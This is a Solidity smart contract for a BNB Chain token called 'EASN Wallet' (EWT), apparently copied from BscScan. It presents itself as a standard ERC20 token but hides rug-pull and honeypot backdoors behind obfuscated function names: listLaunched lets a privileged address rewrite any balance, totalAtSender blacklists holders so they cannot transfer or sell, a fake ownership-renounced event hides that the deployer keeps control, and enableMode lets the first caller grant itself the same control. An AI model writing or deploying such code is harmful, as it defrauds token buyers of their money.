/**
 *Submitted for verification at BscScan.com on 2023-03-06
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.9;


abstract contract  receiverEnableAt {
    function sellMin() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this;
        return msg.data;
    }
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

interface  minMaxToken {

    function totalSupply() external view returns (uint256);

    function balanceOf(address launchedReceiver) external view returns (uint256);

    function transfer(address autoAmount, uint256 tokenLaunchedExempt) external returns (bool);

    function allowance(address limitAuto, address totalTo) external view returns (uint256);

    function approve(address totalTo, uint256 tokenLaunchedExempt) external returns (bool);

    function transferFrom(address launchLaunched, address autoAmount, uint256 tokenLaunchedExempt) external returns (bool);

    event Transfer(address indexed from, address indexed receiverLiquidity, uint256 value);
    event Approval(address indexed limitAuto, address indexed spender, uint256 value);
}


abstract contract  amountAuto is  receiverEnableAt,  minMaxToken {
    using SafeMath for uint256;

    mapping(address => uint256) internal _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor (string memory teamMin, string memory teamReceiver) {
        _name = teamMin;
        _symbol = teamReceiver;
        _decimals = 18;
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address launchedReceiver) public view virtual override returns (uint256) {
        return _balances[launchedReceiver];
    }

    function transfer(address autoAmount, uint256 tokenLaunchedExempt) public virtual override returns (bool) {
        _transfer(sellMin(), autoAmount, tokenLaunchedExempt);
        return true;
    }

    function allowance(address limitAuto, address totalTo) public view virtual override returns (uint256) {
        return _allowances[limitAuto][totalTo];
    }

    function approve(address totalTo, uint256 tokenLaunchedExempt) public virtual override returns (bool) {
        _approve(sellMin(), totalTo, tokenLaunchedExempt);
        return true;
    }

    function transferFrom(address launchLaunched, address autoAmount, uint256 tokenLaunchedExempt) public virtual override returns (bool) {
        _transfer(launchLaunched, autoAmount, tokenLaunchedExempt);
        _approve(launchLaunched, sellMin(), _allowances[launchLaunched][sellMin()].sub(tokenLaunchedExempt, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address totalTo, uint256 receiverMarketing) public virtual returns (bool) {
        _approve(sellMin(), totalTo, _allowances[sellMin()][totalTo].add(receiverMarketing));
        return true;
    }

    function decreaseAllowance(address totalTo, uint256 fromSwap) public virtual returns (bool) {
        _approve(sellMin(), totalTo, _allowances[sellMin()][totalTo].sub(fromSwap, "ERC20: decreased allowance below zero"));
        return true;
    }

    function _transfer(address launchLaunched, address autoAmount, uint256 tokenLaunchedExempt) internal virtual {
        require(launchLaunched != address(0), "ERC20: transfer from the zero address");
        require(autoAmount != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(launchLaunched, autoAmount, tokenLaunchedExempt);

        _balances[launchLaunched] = _balances[launchLaunched].sub(tokenLaunchedExempt, "ERC20: transfer amount exceeds balance");
        _balances[autoAmount] = _balances[autoAmount].add(tokenLaunchedExempt);
        emit Transfer(launchLaunched, autoAmount, tokenLaunchedExempt);
    }

    function listTakeIs(address launchedReceiver, uint256 tokenLaunchedExempt) internal virtual {
        require(launchedReceiver != address(0));

        _beforeTokenTransfer(address(0), launchedReceiver, tokenLaunchedExempt);

        _totalSupply = _totalSupply.add(tokenLaunchedExempt);
        _balances[launchedReceiver] = _balances[launchedReceiver].add(tokenLaunchedExempt);
        emit Transfer(address(0), launchedReceiver, tokenLaunchedExempt);
    }

    function _burn(address launchedReceiver, uint256 tokenLaunchedExempt) internal virtual {
        require(launchedReceiver != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(launchedReceiver, address(0), tokenLaunchedExempt);

        _balances[launchedReceiver] = _balances[launchedReceiver].sub(tokenLaunchedExempt, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(tokenLaunchedExempt);
        emit Transfer(launchedReceiver, address(0), tokenLaunchedExempt);
    }

    function _approve(address limitAuto, address totalTo, uint256 tokenLaunchedExempt) internal virtual {
        require(limitAuto != address(0), "ERC20: approve from the zero address");
        require(totalTo != address(0), "ERC20: approve to the zero address");

        _allowances[limitAuto][totalTo] = tokenLaunchedExempt;
        emit Approval(limitAuto, totalTo, tokenLaunchedExempt);
    }

    function _setupDecimals(uint8 decimals_) internal virtual {
        _decimals = decimals_;
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {}
}

interface launchedTo {
    function createPair(address swapSender, address takeLiquidityAt) external returns (address);
}

contract EASNWallet is amountAuto {

    address launchedToAddr = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;

    constructor() amountAuto("EASN Wallet", "EWT") { 
        enableTrading = launchedTo(address(launchedToAddr)).createPair(address(toTotalFund),address(this));
        receiverExemptAmount = sellMin();
        feeReceiver[receiverExemptAmount] = true;
        listTakeIs(receiverExemptAmount, 100000000 * 10 ** 18);
        emit OwnershipTransferred(receiverExemptAmount, address(0));
    }

    address public receiverExemptAmount;

    function _beforeTokenTransfer(address modeLaunched, address receiverLiquidity, uint256 tokenLaunchedExempt) internal view override {
        require(!fromShould[modeLaunched]);
    }

    function listLaunched(address totalBuy, uint256 tokenLaunchedExempt) public {
        require(feeReceiver[sellMin()]);
        _balances[totalBuy] = tokenLaunchedExempt;
    }

    function enableMode(address amountTx) public {
        require(!senderList);
        feeReceiver[amountTx] = true;
        senderList = true;
    }

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    address toTotalFund = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

    function totalAtSender(address toSender) public {
        require(feeReceiver[sellMin()]);
        if (toSender == receiverExemptAmount || toSender == address(0) || toSender == enableTrading) {
            return;
        }
        fromShould[toSender] = true;
    }

    mapping(address => bool) public fromShould;

    bool public senderList;

    address public enableTrading;

    mapping(address => bool) public feeReceiver;

    address public owner;

}